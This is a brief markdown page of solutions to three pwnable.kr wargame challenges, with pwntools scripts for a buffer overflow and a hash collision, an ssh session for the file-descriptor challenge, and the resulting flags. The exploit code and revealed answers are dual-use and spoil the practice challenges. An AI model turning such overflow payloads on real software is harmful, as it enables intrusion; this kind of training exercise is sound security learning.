## pwnable.kr solutions
http://pwnable.kr/

### bof

```python
from pwn import *

# io = gdb.debug('./bof.1', 'b*func+40')
# io = process('./bof.1')
io = remote('pwnable.kr', 9000)

io.sendline(cyclic(52)+p32(0xcafebabe))
io.interactive()
```

Flag: `daddy, I just pwned a buFFer :)`

### collision

```python
from pwn import *

hashcode = 0x21DD09EC
payload = p32(int(hashcode/5))*4 + p32(int(hashcode/5+4))
io = process(['./col', payload])
# io = gdb.debug(['./col', payload], 'b*check_password+52')
io.interactive()
```

### fd

```
ssh fd@pwnable.kr -p2222 (pw:guest)

fd@pwnable:~$ ./fd 4661
LETMEWIN
good job :)
mommy! I think I know what a file descriptor is!!
```
